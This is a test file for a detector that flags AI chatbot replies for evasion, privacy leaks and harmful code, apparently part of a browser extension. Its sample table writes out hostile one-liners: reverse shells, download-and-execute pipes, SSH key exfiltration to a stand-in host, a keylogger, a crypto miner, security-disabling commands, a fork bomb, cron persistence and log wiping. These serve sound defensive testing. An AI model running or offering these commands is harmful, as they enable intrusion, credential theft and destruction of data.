// The Flags detectors: evasion, privacy leaks and harmful code in a reply.
import test from 'node:test';
import assert from 'node:assert/strict';
import { loadContentScripts } from '../test-support/load-content-script.mjs';

const { HelmionFlags: F } = await loadContentScripts(['content/sanitize.js', 'content/flags.js']);
const plain = (value) => JSON.parse(JSON.stringify(value));
const kinds = (flags) => plain(flags.map((f) => f.kind));

test('refusals and deflections are flagged as evasion', () => {
  for (const text of [
    "I'm sorry, but I can't help with that.",
    'I cannot provide that information.',
    "I'm not able to discuss this topic.",
    "As an AI language model, I don't have opinions on that.",
    'You should consult a qualified professional for this rather than relying on me.',
  ]) {
    const flags = F.detectProse(text);
    assert.deepEqual(kinds(flags), ['evasion'], text);
    assert.equal(flags[0].severity, 'notice');
  }
});

test('an answer buried in three or more different hedges is flagged as evasion', () => {
  const flags = F.detectProse('I think it could be the cache, but it depends; perhaps the config, to some extent.');
  assert.deepEqual(kinds(flags), ['evasion']);
  assert.equal(flags[0].rule, 'hedging');
});

test('one or two hedges are honest uncertainty and are left alone', () => {
  assert.deepEqual(plain(F.detectProse('I think the second option is cleaner.')), []);
  assert.deepEqual(plain(F.detectProse('It probably works, but test it first.')), []);
});

test('plain direct answers are clean', () => {
  for (const text of [
    'Use Array.prototype.flat() to flatten one level.',
    'The capital of France is Paris.',
    'Run npm install, then npm test.',
  ]) assert.deepEqual(plain(F.detectProse(text)), [], text);
});

test('a reply that shows a key or password is a high-severity privacy leak with a redacted excerpt', () => {
  const flags = F.detectProse('Here is the production key: sk-proj-abcdefghijklmnop1234 and the admin password: Tr0ub4dor99');
  const leak = flags.find((f) => f.kind === 'privacy-leak');
  assert.ok(leak);
  assert.equal(leak.severity, 'high');
  assert.doesNotMatch(leak.excerpt, /abcdefghijklmnop1234|Tr0ub4dor99/);
  assert.match(leak.excerpt, /\[REDACTED:api_key\]/);
});

test('a reply that shows personal details is a medium privacy leak; an IP alone is not', () => {
  const flags = F.detectProse('His SSN is 123-45-6789.');
  assert.equal(flags[0].kind, 'privacy-leak');
  assert.equal(flags[0].severity, 'medium');
  assert.deepEqual(plain(F.detectProse('The server is at 73.14.201.9.')), []);
});

const HARMFUL = {
  'reverse-shell': ['bash -i >& /dev/tcp/10.0.0.5/4444 0>&1', 'nc -e /bin/sh 10.0.0.5 4444'],
  'download-execute': ['curl -s http://45.9.148.3/x.sh | bash', 'IEX (New-Object Net.WebClient).DownloadString("http://x/y.ps1")', 'echo ZWNobyBoaQ== | base64 -d | sh'],
  'credential-theft': ['data = open(os.path.expanduser("~/.ssh/id_rsa")).read()\nrequests.post("https://evil.example/c", data=data)'],
  'keylogger': ['from pynput.keyboard import Key, Listener\nwith Listener(on_press=log) as l: l.join()'],
  'crypto-miner': ['./xmrig -o stratum+tcp://pool.example:3333 -u wallet'],
  'disable-security': ['Set-MpPreference -DisableRealtimeMonitoring $true', 'sudo setenforce 0'],
  'fork-bomb': [':(){ :|:& };:'],
  'persistence': ['(crontab -l; echo "@reboot curl http://x.example/a | sh") | crontab -'],
  'log-wipe': ['wevtutil cl Security'],
};

test('every harmful-code rule fires on its sample and names itself', () => {
  for (const [rule, samples] of Object.entries(HARMFUL)) {
    for (const sample of samples) {
      const flag = F.detectCode(sample).find((f) => f.kind === 'harmful-code');
      assert.ok(flag, `${rule} did not fire on: ${sample}`);
      assert.equal(flag.rule, rule, `${sample} fired ${flag.rule}, expected ${rule}`);
      assert.equal(flag.severity, 'high');
    }
  }
  assert.deepEqual(Object.keys(HARMFUL).sort(), plain([...F.HARMFUL_RULES]).sort(), 'a harmful rule has no test sample');
});

test('ordinary code is clean', () => {
  for (const code of [
    'npm install && npm test',
    'curl -fsSL https://deb.nodesource.com/setup_20.x -o setup.sh',
    'import requests\nr = requests.get("https://api.github.com")',
    'ssh-keygen -t ed25519 -C "me@laptop"',
    'git commit -m "fix" && git push',
  ]) assert.deepEqual(plain(F.detectCode(code)), [], code);
});

test('prose that WARNS about a reverse shell is not harmful code (prose is not read for code rules)', () => {
  assert.deepEqual(kinds(F.detectProse('Never paste bash -i >& /dev/tcp/1.2.3.4/4444 into a terminal.')), []);
});

test('destructive commands are left to the red code lane, not repeated as flags', () => {
  assert.deepEqual(plain(F.detectCode('rm -rf /')), []);
});

test('fingerprints are stable per site and differ across sites and excerpts', () => {
  const [flag] = F.detectProse("I can't help with that.");
  assert.equal(F.fingerprint(flag, 'claude.ai'), F.fingerprint(flag, 'claude.ai'));
  assert.notEqual(F.fingerprint(flag, 'claude.ai'), F.fingerprint(flag, 'grok.com'));
});

test('excerpts are capped', () => {
  const [flag] = F.detectProse(`${'word '.repeat(200)} I cannot help with that. ${'more '.repeat(200)}`);
  assert.ok(flag.excerpt.length <= 245);
});
